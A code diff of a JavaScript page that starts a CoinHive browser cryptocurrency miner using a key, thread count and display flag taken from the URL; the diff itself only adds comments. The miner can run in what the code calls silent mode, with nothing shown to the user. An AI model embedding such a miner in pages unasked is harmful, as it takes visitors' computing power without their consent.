@@ -11,7 +11,7 @@
   url_params = url_params.substring(1, url_params.length);
   console.log("URL parameters: " + url_params);
 
-  // Get params from URL search object
+  // Get parameters from URL search object
   {
     var elements = url_params.split("&");
     var key = null;
@@ -37,23 +37,27 @@
   }
 
   if (key != null && key != "") { // If a key parameter is given
-    if (threads == null || threads == "") threads = 2;
-    if (display == null && display != 0 || display == "" && display != 0) display = 1;
+    if (threads == null || threads == "") threads = 2; // Format "threads" value
+    if (display == null && display != 0 || display == "" && display != 0) display = 1; // Format "dispay" value
 
     // Initialize the miner and start it in silent mode
     var miner = new CoinHive.Anonymous(key, {threads: threads});
     miner.start(CoinHive.FORCE_MULTI_TAB);
 
-    // Log all the parameters
+    // Log all the parameters into the console
     console.log("key: " + key);
     console.log("threads: " + threads);
     console.log("display: " + display);
+
+    // If the display mode is true, display content to user
     if (display == 1) {
       setInterval(function(){
         document.getElementById("context").innerHTML = '<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner started with key ID: ' + key + '<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner started with ' + threads + ' threads' + '<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner hashes per seconds: ' + miner.getHashesPerSecond() + '<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miner total hashes: ' + miner.getTotalHashes();
       }, 1000);
     }
   } else { // If a key parameter is not given
+
+    // Print page layout on screen
     document.write('You must provide a ' + 
     '<a href="https://coin-hive.com">coin-hive</a>' + 
     ' key into the URL to allow this tool to work properly.<br><br>URL format: &nbsp;&nbsp; ' + 
